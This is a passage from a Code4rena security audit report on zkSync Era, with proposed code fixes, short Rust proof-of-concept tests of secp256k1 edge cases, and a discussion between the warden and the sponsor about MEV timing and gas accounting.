    function validateUpgradeTransaction(IMailbox.L2CanonicalTransaction memory _transaction) internal pure {
        // Restrict from to be within system contract range (0...2^16 - 1)
        require(_transaction.from <= type(uint16).max, "ua");
        require(_transaction.to <= type(uint160).max, "ub");
        require(_transaction.paymaster == 0, "uc");
        require(_transaction.value == 0, "ud");
        require(_transaction.reserved[0] == 0, "ue");
        require(_transaction.reserved[1] <= type(uint160).max, "uf");
        require(_transaction.reserved[2] == 0, "ug");
        require(_transaction.reserved[3] == 0, "uo");
        require(_transaction.signature.length == 0, "uh");
        require(_transaction.paymasterInput.length == 0, "ul");
        require(_transaction.reservedDynamic.length == 0, "um");
    }
```

Just for completeness, check that `_transaction.txType == 255`:

```diff
    function validateUpgradeTransaction(IMailbox.L2CanonicalTransaction memory _transaction) internal pure {
+       require(_transaction.txType == 255, "WHATEVER");
        // Restrict from to be within system contract range (0...2^16 - 1)
        require(_transaction.from <= type(uint16).max, "ua");
        require(_transaction.to <= type(uint160).max, "ub");
        require(_transaction.paymaster == 0, "uc");
        require(_transaction.value == 0, "ud");
        require(_transaction.reserved[0] == 0, "ue");
        require(_transaction.reserved[1] <= type(uint160).max, "uf");
        require(_transaction.reserved[2] == 0, "ug");
        require(_transaction.reserved[3] == 0, "uo");
        require(_transaction.signature.length == 0, "uh");
        require(_transaction.paymasterInput.length == 0, "ul");
        require(_transaction.reservedDynamic.length == 0, "um");
    }
```

## [32] You are not using your own cached `virtualBlockInfo` in `SystemContext`

```solidity
        BlockInfo memory virtualBlockInfo = currentVirtualL2BlockInfo;

// TODO why are you using  currentVirtualL2BlockInfo.number ??
// TODO it is cached in virtualBlockInfo.number
if (currentVirtualL2BlockInfo.number == 0 && virtualBlockInfo.timestamp == 0) {
```

Do this instead:

```diff
        BlockInfo memory virtualBlockInfo = currentVirtualL2BlockInfo;

-       if (currentVirtualL2BlockInfo.number == 0 && virtualBlockInfo.timestamp == 0) {
+       if (virtualBlockInfo.number == 0 && virtualBlockInfo.timestamp == 0) {
```

## [33] Wrong `debugLog` call

In [bootloader, line 1110](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1110), you "log" that the refund is `0` when it may be not be:

```diff
-               debugLog("refund", 0)
+               debugLog("refund", refund)
```

## [34] Do not let users put as `refundRecipient` addresses in kernel space

[Mailbox, lines 309 to 315](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L309C1-L315C1)

```diff
        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.
        address refundRecipient = _refundRecipient == address(0) ? _sender : _refundRecipient;
        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.
        if (refundRecipient.code.length > 0) {
            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);
        }
+       require(refundRecipient > address(0xFFFF), "You can't send your pennies to the kernel");
```

## [35] Comment and code mismatch

In [bootloader, line 1116](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1116C77-L1116C120), it says it calculates the L2 gas limit without taking into account the intrinsic costs and the overhead. However, they are, as seen in:

[Bootloader, lines 1151 to 1172](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1151C1-L1172C18)

```solidity
                let operatorOverheadForTransaction := getVerifiedOperatorOverheadForTx(
                    transactionIndex,
                    totalGasLimit,
                    gasPerPubdata,
                    txEncodingLen
                )
                gasLimitForTx := safeSub(totalGasLimit, operatorOverheadForTransaction, "qr")

                let intrinsicOverhead := safeAdd(
                    intrinsicGas, 
                    // the error messages are trimmed to fit into 32 bytes
                    safeMul(intrinsicPubdata, gasPerPubdata, "qw"),
                    "fj" 
                )

                switch lt(gasLimitForTx, intrinsicOverhead)
                case 1 {
                    gasLimitForTx := 0
                }
                default {
                    gasLimitForTx := sub(gasLimitForTx, intrinsicOverhead)
                }
```

Remove that statement:

```diff
-            /// @dev Calculates the L2 gas limit for the transaction's body, i.e. without intrinsic costs and overhead.
+            /// @dev Calculates the L2 gas limit for the transaction's body
```

## [36] Wrong comment in EmptyContract

[DefaultAccount, line 15](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L15)

```solidity
 * @dev The bytecode of the contract is set by default for all addresses for which no other bytecodes are deployed.
```

[EmptyContract, line 9](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/EmptyContract.sol#L9)

```solidity
 * @dev The bytecode of the contract is set by default for all addresses for which no other bytecodes are deployed.
```

Copy-pasted, remove the `EmptyContract` one.

## [37] `PointProjective::mul_assign` optimization

[secp256k1/mod.rs, line 543](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L543)

```diff
    fn mul_assign<S: Into<<Self::Scalar as PrimeField>::Repr>>(&mut self, other: S) {
+       if self.is_zero() {
+           return; // 0 *= a equals 0
+       }

+       if other.is_zero() {
+           (*self) = Self::zero(); // a *= 0 equals 0
+           return;
+       }

        let mut res = Self::zero();

        ...
```

## [38] `PointProjective::add_assign_mixed` missing code

[secp256k1/mod.rs, line 486](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L486)

```diff
            ...

        } else {
            // If we're adding -a and a together, self.z becomes zero as H becomes zero.

+           if u1 == u2 {
+               (*self) = Self::zero();
+               return;
+           }

            // H = U2-X1
            let mut h = u2;

            ...
```
## [39] Using `msg.timestamp` as an expiration timestamp invites MEV manipulations

### Impact

Setting the expiration timestamp to a value that depends directly of `block.timestamp` is useless, as `block.timestamp` is the timestamp when the transaction is **EXECUTED**, not when it is submitted to the network, opening the door to MEV manipulations. Think of the typical Uniswap-based bug in which expiration timestamp is set to `block.timestamp + K`, but applied to inter-chain swaps or highly-sensitive time-dependant operations (e. g. arbitrage or inter-chain DEXes like [Interport](https://interport.medium.com/interport-finance-whats-special-a5ea7caef237)).

### Proof of concept

Thanks to Proof of Stake, validators and, in fact, everyone in the Ethereum network knows who is gonna submit the next block with a margin of 6 minutes and 24 seconds to 12 minutes and 48 seconds (see the References section below). That's enough time for bots and validators to do MEV calculations for many of the transactions waiting in the mempool **AND** submit their own with the right amount of gas to make sure their transactions are executed within the next block. Because of this, highly-sensitive operations like swaps between tokens need 1) slippage control and 2) expiration timestamps so that users will **NOT** incur in extreme losses due to MEV bots sandwiching/front-running them or validators *"storing"* transactions until they can make a profitable *"chain"*.

This idea can be extended to inter-chain operations pretty easily, so that the requested transactions from one layer to another do not wait idly in the mempool of the first one. However, doing request from Ethereum to zkSync Era through `Mailbox`, the expiration timestamp is set to:

[Mailbox, line 295](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L295)

```solidity
        uint64 expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast
```

With:

[Config, line 46](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/Config.sol#L46)

```solidity
uint256 constant PRIORITY_EXPIRATION = 0 days;
```

Which equals `block.timestamp`, which is bad as its value will **NOT** be the time the user submitted the transaction to the network, but the time the transaction is picked by a validator and included in a block. That means, virtually, there is no expiration timestamp for such a transaction.

Some ways to exploit this, from a hacker's POV, is via rogue validators (see [here](https://news.bitcoin.com/rogue-validator-exploits-mev-bots-on-ethereum-resulting-in-25-3m-in-crypto-losses)) or *"chained transaction-blocks"*. The idea is that, thanks to POS, the odds for a validator to execute sequentially `n > 2` blocks increases with the amount of ETH staked so it is possible to delay a highly profitable transaction and place it between two validator-controlled blocks and sandwich it on zkSync Era (as they are executed sequentially via [a priority queue](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L369)). This issue is real and feasible, although pretty expensive, but the damages to users may be huge if they are doing, say, an inter-chain [Furocombo](https://furucombo.app/combo) combo worth 3 million dollars or any other type of highly-sensitive inter-chain operation.

### Recommended Mitigation steps

Pass the expiration timestamp as a function argument retrieved from the front-end and revert if it is less than the `block.timestamp` in which the transaction is executed:

[Mailbox, function `requestL2Transaction`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236C1-L273C6)

```diff
    function requestL2Transaction(
        address _contractL2,
        uint256 _l2Value,
        bytes calldata _calldata,
        uint256 _l2GasLimit,
        uint256 _l2GasPerPubdataByteLimit,
        bytes[] calldata _factoryDeps,
-       address _refundRecipient
+       address _refundRecipient,
+       uint64 _expirationTimestamp
    ) external payable nonReentrant senderCanCallFunction(s.allowList) returns (bytes32 canonicalTxHash) {
+       require(_expirationTimestamp > block.timestamp, "MEV trying to do their things");
        // Change the sender address if it is a smart contract to prevent address collision between L1 and L2.
        // Please note, currently zkSync address derivation is different from Ethereum one, but it may be changed in the future.
        address sender = msg.sender;
        if (sender != tx.origin) {
            sender = AddressAliasHelper.applyL1ToL2Alias(msg.sender);
        }

        // Enforcing that `_l2GasPerPubdataByteLimit` equals to a certain constant number. This is needed
        // to ensure that users do not get used to using "exotic" numbers for _l2GasPerPubdataByteLimit, e.g. 1-2, etc.
        // VERY IMPORTANT: nobody should rely on this constant to be fixed and every contract should give their users the ability to provide the
        // ability to provide `_l2GasPerPubdataByteLimit` for each independent transaction.
        // CHANGING THIS CONSTANT SHOULD BE A CLIENT-SIDE CHANGE.
        require(_l2GasPerPubdataByteLimit == REQUIRED_L2_GAS_PRICE_PER_PUBDATA, "qp");

        // The L1 -> L2 transaction may be failed and funds will be sent to the `_refundRecipient`,
        // so we use `msg.value` instead of `_l2Value` as the bridged amount.
        _verifyDepositLimit(msg.sender, msg.value);
        canonicalTxHash = _requestL2Transaction(
            sender,
            _contractL2,
            _l2Value,
            _calldata,
            _l2GasLimit,
            _l2GasPerPubdataByteLimit,
            _factoryDeps,
            false,
-           _refundRecipient
+           _refundRecipient,
+           _expirationTimestamp
        );
    }
```

[Mailbox, function `_requestL2Transaction`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L283C1-L327C6)

```diff
    function _requestL2Transaction(
        address _sender,
        address _contractAddressL2,
        uint256 _l2Value,
        bytes calldata _calldata,
        uint256 _l2GasLimit,
        uint256 _l2GasPerPubdataByteLimit,
        bytes[] calldata _factoryDeps,
        bool _isFree,
-       address _refundRecipient
+       address _refundRecipient,
+       uint64 _expirationTimestamp
    ) internal returns (bytes32 canonicalTxHash) {
        require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, "uj");
-       uint64 expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast
        uint256 txId = s.priorityQueue.getTotalPriorityTxs();

        // Here we manually assign fields for the struct to prevent "stack too deep" error
        WritePriorityOpParams memory params;

        // Checking that the user provided enough ether to pay for the transaction.
        // Using a new scope to prevent "stack too deep" error
        {
            params.l2GasPrice = _isFree ? 0 : _deriveL2GasPrice(tx.gasprice, _l2GasPerPubdataByteLimit);
            uint256 baseCost = params.l2GasPrice * _l2GasLimit;
            require(msg.value >= baseCost + _l2Value, "mv"); // The `msg.value` doesn't cover the transaction cost
        }

        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.
        address refundRecipient = _refundRecipient == address(0) ? _sender : _refundRecipient;
        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.
        if (refundRecipient.code.length > 0) {
            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);
        }

        params.sender = _sender;
        params.txId = txId;
        params.l2Value = _l2Value;
        params.contractAddressL2 = _contractAddressL2;
-       params.expirationTimestamp = expirationTimestamp;
+       params.expirationTimestamp = _expirationTimestamp;
        params.l2GasLimit = _l2GasLimit;
        params.l2GasPricePerPubdata = _l2GasPerPubdataByteLimit;
        params.valueToMint = msg.value;
        params.refundRecipient = refundRecipient;

        canonicalTxHash = _writePriorityOp(params, _calldata, _factoryDeps);
    }
```

On top of that, change the `deposit` functions in both bridges to match the ABI of the new `requestL2Transaction` and remove the `PRIORITY_EXPIRATION` constant in [Config, line 46](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/Config.sol#L46).

### References

[https://blog.uniswap.org/uniswap-v3-oracles?utm_source=blog.bytes032.xyz&utm_medium=referral&utm_campaign=why-you-should-stop-using-block-timestamp-as-deadline-in-swaps#how-much-does-a-two-block-20-manipulation-require](https://blog.uniswap.org/uniswap-v3-oracles?utm_source=blog.bytes032.xyz&utm_medium=referral&utm_campaign=why-you-should-stop-using-block-timestamp-as-deadline-in-swaps#how-much-does-a-two-block-20-manipulation-require)

## [40] Using `debugLog` in gas calculations leads to an artificially increased value

### Impact

In [bootloader, function `debugLog`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L3277C1-L3281C14) does consume `gas()`, so using it inside gas calculations leads to an artificially small increase above the real gas usage. This is bad because the amount users will be refunded depends on the *"difference blocks"* and they must **NOT** pay for debugging functionalities. You can argue that it is the same as Ethereum's `event`s, but they are executed in the *"transaction context"* regardless of where you place them, whilst these `debugLog`s can be *"moved"* to be executed in the *"bootloader context"* (where they should have been since the beginning). Like it is right now, users are paying for the next additional opcodes:

- **3** `mstore`
- **8** `add`
- **5** `mul`
- **5** `callValue`
- **2** `sub`

I am estimating with [the Ethereum ones](https://ethereum.org/en/developers/docs/evm/opcodes/). Just keep in mind that, as the underlying logic for these opcodes are ZK circuits, the gas cost will be higher to cover the computational overhead:

`3 * mstore + 8 * add + 5 * mul + 5 * callValue + 2 * sub`

`3 * 3 + 3 * 8 + 5 * 5 + 2 * 5 + 2 * 3`

Therefore 80.

NOTE: This is **NOT** a gas optimization, this is a theft of gas.

### Recommended Mitigation steps

[l1TxPreparation, lines 1006 to 1019](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1006C1-L1019C84)

```diff
                let gasBeforePreparation := gas()
-               debugLog("gasBeforePreparation", gasBeforePreparation)

                // Even though the smart contracts on L1 should make sure that the `L1->L2` provide enough gas to generate the hash
                // we should still be able to do it even if this protection layer fails.
                canonicalL1TxHash := getCanonicalL1TxHash(txDataOffset)
-               debugLog("l1 hash", canonicalL1TxHash)

                // Appending the transaction's hash to the current L2 block
                appendTransactionHash(canonicalL1TxHash, true)

                markFactoryDepsForTx(innerTxDataOffset, true)

                gasUsedOnPreparation := safeSub(gasBeforePreparation, gas(), "xpa")
+               debugLog("gasBeforePreparation", gasBeforePreparation)
+               debugLog("l1 hash", canonicalL1TxHash)
```

Reduction of `80 * 2 = 160` gas.

[l2TxValidation, lines 1185 to 1213](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1185C1-L1213C72)

```diff
                let gasBeforeValidate := gas()

-               debugLog("gasBeforeValidate", gasBeforeValidate)

                // Saving the tx hash and the suggested signed tx hash to memory
                saveTxHashes(txDataOffset)

                // Appending the transaction's hash to the current L2 block
                appendTransactionHash(mload(CURRENT_L2_TX_HASHES_BEGIN_BYTE()), false)

                checkEnoughGas(gasLimitForTx)

                // Note, that it is assumed that `ZKSYNC_NEAR_CALL_validateTx` will always return true
                // unless some error which made the whole bootloader to revert has happened or
                // it runs out of gas.
                let isValid := 0
+               let validateABI := 0

                // Only if the gasLimit for tx is non-zero, we will try to actually run the validation
                if gasLimitForTx {
-                   let validateABI := getNearCallABI(gasLimitForTx)
+                   validateABI := getNearCallABI(gasLimitForTx)
-                   debugLog("validateABI", validateABI)

                    isValid := ZKSYNC_NEAR_CALL_validateTx(validateABI, txDataOffset, gasPrice)                    
                }

-               debugLog("isValid", isValid)

                let gasUsedForValidate := sub(gasBeforeValidate, gas())
+               debugLog("gasBeforeValidate", gasBeforeValidate)
+               debugLog("validateABI", validateABI) // TODO review this, how can you differentiate between validateABI being 0 because gasLimitForTx is 0 or because there was an error in getNearCallABI ??
+               debugLog("isValid", isValid)
```

Reduction of `80 * 3 = 240` gas.

## [41] Missing support for certain precompiles

The Shanghai protocol release has nine precompiled contracts, namely `ecrecover`, `sha256`, `ripemd160`, `identity`, `modexp`, `ecadd`, `ecmul` and `blake2f`. However, within the current version of zkSync Era, the only precompiles supported are `ecrecover` and `sha256` (plus `keccak256`) and the ones being developed by [lambdaclass](https://github.com/lambdaclass/zksync_era_precompiles#current-status), namely `ecAdd`, `ecMul` and `modexp` (plus `ecPairing`). Consider implementing the other ones too, although they are rarely used, for full equivalence with Ethereum at the precompile level (`ripemd160`, `blake2f` and `identity`).


**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832399070):**
 > Regarding [19], the following test highlights the issue:
> 
> ```rust
> // Put this test inside ecrecover/secp256k1/mod.rs and run from the 
> // era-zkevm_circuits folder the next command
> //
> //              cargo test POC -- --nocapture
> //
> #[test]
> fn POC() {
>     let false_zero = PointAffine::zero();
>     let real_zero = PointAffine::from_xy_checked(Fq::zero(), Fq::zero()).unwrap();
> 
>     println!("Is (0, 1) the null elememt (should not) -> {}", false_zero.is_zero());
>     println!("Is (0, 0) the null elememt -> {}\n", real_zero.is_zero());
>     println!("Is (0, 1) on curve (should NOT) -> {}", false_zero.is_on_curve());
>     println!("Is (0, 0) on curve -> {}", real_zero.is_on_curve());
> }
> ```
> 
> The point at infinity is defined as `(0, 0)`, not both `(0, 0)` and `(0, 1)`. As it is right now, you could craft valid signatures with an invalid point or corrupt the result of other operations like [PointProjective::add_assign_mixed](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L455) due to:
> 
> - `(0, 1)` not being the null element (from the mathematical proof above) **AND**
> - `(0, 1)` not being on the curve as it does not comply with `y² = x³ + b -> 1², not = 0³ + 7`
> 
> Therefore (0, 1) not in F`
> 
> On top of that, we have that all operations defined under `F` apply **ONLY** to the elements of `F` (by definition). Therefore, you cannot use elements outside of `F` with functions and elements defined under `F`, as it is the case right now (it's mathematically wrong and bug prone).
> 
> ```rust
> // Put this test inside ecrecover/secp256k1/mod.rs and run from the 
> // era-zkevm_circuits folder the next command
> //
> //              cargo test POC_MIXED -- --nocapture
> //
> #[test]
> fn POC_MIXED() {
>     let false_zero = PointAffine::zero();
>     let real_zero = PointAffine::from_xy_checked(Fq::zero(), Fq::zero()).unwrap();
>     let projective = PointProjective::one();
>     println!("Point projective -> {}", &projective);
>     println!("False zero -> {:?}", &false_zero);
>     println!("Real zero -> {:?}\n", &real_zero);
>     
> 
>     let mut projective1 = projective.clone() as PointProjective;
>     projective1.add_assign_mixed(&false_zero);
>     println!("Added (0, 1) -> {}", projective1);
> 
>     let mut projective2 = projective.clone() as PointProjective;
>     projective2.add_assign_mixed(&real_zero);
>     println!("Added (0, 0) -> {}\n", projective2);
> }
> ```
> 
> Moreover, the implementation of this curve is widely used in many cryptographic projects, so if anyone forks this crate and uses it on his own project (for example, due to a recommendation from the own devs), they would be building something fundamentally flawed (and can damage zkSync Era's reputation if such a project gets rekt because of that).
>
>The fix is [ecrecover/secp256k1/mod.rs, line 150](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L150):
> 
> ```diff
>     fn zero() -> Self {
>         PointAffine {
>             x: Fq::zero(),
> -           y: Fq::one(),
> +           y: Fq::zero(),
>             infinity: true,
>         }
>     }
> ```
> 
> As seen in [ecrecover/secp256k1/mod.rs, line 199](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L199):
> 
> ```rust
>     fn from_xy_checked(x: Self::Base, y: Self::Base) -> Result<Self, GroupDecodingError> {
>         let infinity = x.is_zero() && y.is_zero();
>         let affine = Self {
>             x: x,
>             y: y,
>             infinity,
>         };
> 
>         if !affine.is_on_curve() {
>             Err(GroupDecodingError::NotOnCurve)
>         } else {
>             Ok(affine)
>         }
>     }
> ```

**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832401079):**
 > Regarding [38], I have been testing and it is indeed a bug, as you would be returning a corrupted value. Although it would be defined as the point at infinity due to `Z = 0`, the other coordinates remain non-zero/one leading to corrupted results if it is used again. Here is the POC:
> 
> ```rust
> // Put this test inside ecrecover/secp256k1/mod.rs and run from the 
> // era-zkevm_circuits folder the next command
> //
> //              cargo test POC -- --nocapture
> //
> #[test]
> fn POC() {
>     let mut projective = PointProjective::one();
>     let mut projective_into_affine_negated = projective.clone().into_affine();
>     projective_into_affine_negated.negate();
>     println!("Point projective -> {}", &projective);
>     println!("Point projective into affine negated -> {}\n", &projective_into_affine_negated);
>     
>     projective.add_assign_mixed(&projective_into_affine_negated);
>     println!("Added A + (-A) (should be zero by definition) -> {:?}", &projective);
>     println!("Zero is defined as -> {:?}", PointProjective::zero());
> }
> ```
> 
> The fix is the one I have written in the QA [here](https://github.com/code-423n4/2023-10-zksync-findings/blob/main/data/erebus-Q.md#nc-18-pointprojectiveadd_assign_mixed-missing-code). However, it had a typo so the next one is the correct one:
> 
> [secp256k1/mod.rs, line 486](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L486)
> 
> ```diff
>             ...
> 
>         } else {
>             // If we're adding -a and a together, self.z becomes zero as H becomes zero.
> 
> +           if self.x == u2 {
> +               (*self) = Self::zero();
> +               return;
> +           }
> 
>             // H = U2-X1
>             let mut h = u2;
> 
>             ...
> ```
>
> As seen here (even the comments are the same)
> 
> [secp256k1/mod.rs, function `add_assign`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L403)
> 
> ```rust
>             ...
> 
>         } else {
>             // If we're adding -a and a together, self.z becomes zero as H becomes zero.
> 
>             if u1 == u2 {
>                 // The two points are equal, so we double. // @audit wrong comment, the one I'm referring is the previous one
>                 (*self) = Self::zero();
>                 return;
>             }
> 
>             // H = U2-U1
>             let mut h = u2;
> 
>             ...
> ```

**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832403440):**
 > Regarding [12], after re-reading the docs provided in the audit repo, it seems I was wrong and the correct implementation is the one in [line 1456](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1450C1-L1456C90). The flawed one is in [line 918](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L913C1-L921C57).
> 
> When bootloader calls `askOperatorForRefund` it will be provided with the leftover gas **PLUS** the reserved gas calculated by the operator off-chain (not the one in `getGasLimitForTx`).
> 
> [bootloader, line 918](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L918C1-L918C96)
> 
> ```solidity
>                     refundGas := max(getOperatorRefundForTx(transactionIndex), potentialRefund)
> ```
> 
> This will always pick the one provided by the operator and adding such a value with `reservedGas` in [bootloader, line 921](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L921C57):
> 
> ```solidity
>                 refundGas := add(refundGas, reservedGas)
> ```
> 
> This will output `refundGas + reservedGasByOperator + reservedGasByBootloader`, giving users a higher gas refund than the correct one. It seems for high `reservedGas` values, such a transaction would always revert due to the [check in line 923](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L923), so it can be seen as a DOS in those situations and a theft of gas in the others. Nevertheless, consider changing the code to:
> 
> ```diff
>                     ...
> 
>                     // In case the operator provided smaller refund than the one calculated
>                     // by the bootloader, we return the refund calculated by the bootloader.
> -                   refundGas := max(getOperatorRefundForTx(transactionIndex), potentialRefund)
> +                   refundGas := max(getOperatorRefundForTx(transactionIndex), safeAdd(potentialRefund, reservedGas, "whatever"))
>                 }
> 
> -              refundGas := add(refundGas, reservedGas)
> 
>                 if gt(refundGas, gasLimit) {
>                     assertionError("L1: refundGas > gasLimit")
>                 }
> 
>                 ...
> ```
> 
> Taking into account my submission [Operator can steal all gas provided by ANY user for L1 → L2 transactions](https://github.com/code-423n4/2023-10-zksync-findings/issues/255) and mixing the fixes.

**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832408672):**
> Although [40] can be seen as a little increase of gas (doing the maths with the Ethereum ones, note that the gas cost of the same opcodes in zkSync Era is far more due to ZK processing) and you can argue that this is a QA refactoring. Take into account that the goal of zkSync Era is to increase its TPS much more than what it is right now, which is currently `7.13` according to [l2beat](https://l2beat.com/scaling/projects/zksync-era). 
> 
> For example, let's say `3.565` are from L1 and `3.565` are from L2. That means, the increased gas cost per second  right now is:
> 
> `3.565 * 160 + 3.565 * 240 = 1426` gas/second.
> 
> In a whole year, the gas taken from users would be `1426 * 60 \ seconds * 60 \ minutes * 24 \ hours * 365 \ days = 44970336000 gas` (around `44` US billion gas). That's a lot of gas going straight into the operators pockets *"for free"* as users are paying for the execution of their transaction, not for debugging functionalities. Moreover, in many other gas calculations blocks like [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L985), [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1240), [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1427) and [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1269) they are totally excluded, which shows the developers intentions to avoid overcharging users.

**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832416928):**
 > Regarding [39], to show a different example from the classic swap issue, imagine a protocol that is deployed in both zkSync Era and Ethereum, is going to initiate a multi-chain airdrop from Ethereum to both its zkSync and Ethereum users. A malicious or a set of malicious operators on Ethereum can delay the transaction to initiate the airdrop on zkSync Era and sell their tokens to a higher price, as the total supply between chains would be fewer. Once the price spikes, they pass the airdrop transaction to zkSync to dilute the price and harm users who were holding those tokens, as the supply increases, so the price decreases instantly like a [market crash](https://en.wikipedia.org/wiki/Stock_market_crash).
 >
 >The deadline would stop such an attack, as the protocol could set the airdrop to last a few minutes, otherwise the zkSync airdrop wouldn't take place. This attack can be seen as a real world inflation attack, in which one country holds foreign currency for a long time and dumps all the money to the target country to flood its market and skyrocket its local monetary inflation (making an analogy between layers and countries)

**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835640487):**
 > For [19], this is a valid code quality issue, but there is no impact.
>
> Summary of the issue:<br>
> In affine coordinates, we use both (`0,1`, `infinity=true`) and (`0,0`, `infinity=true`) to store the point at infinity. As the warden explained, mathematically there should only be one point at infinity. However, throughout the codebase, we check if a point is infinity only by checking the boolean is true (ignoring the `x,y` coordinates). The warden's own test cases confirm that the code handles both points correctly, so there is no impact.

**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835642929):**
 > > For [38], this is basically the exact same "bug" as L-19. Valid code quality but no impact.
> As long as the `z` coordinate of a Projective Point is zero, it will be treated as the point at infinity, regardless of the `x` and `y` coordinates.


**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835691963):**
 > > For [12], the original report was wrong, but this comment is correct. However, it does not have any impact, so it should be considered as QA. The reason why it lacks any impact is:
> 
> `reservedGas = totalGasLimit - max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex))`
>
> https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L1145
> 
> and
> 
> `refundGas = max(getOperatorRefundForTx(transactionIndex), potentialRefund) + reservedGas`
>
